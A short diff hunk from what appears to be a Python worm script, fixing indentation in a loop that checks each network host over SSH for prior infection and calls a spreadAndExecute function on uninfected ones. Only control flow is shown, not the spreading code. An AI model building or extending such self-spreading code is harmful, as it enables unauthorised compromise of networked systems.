@@ -242,8 +242,8 @@ for host in networkHosts:
 		
 		print ("Trying to spread")
 		qq = isInfectedSystem(sshInfo[0])
-	 	if qq == True:
-	 		print ("Remote System is Infected")
+		if qq == True:
+			print ("Remote System is Infected")
 			continue
 		else:
 			spreadAndExecute(sshInfo[0])
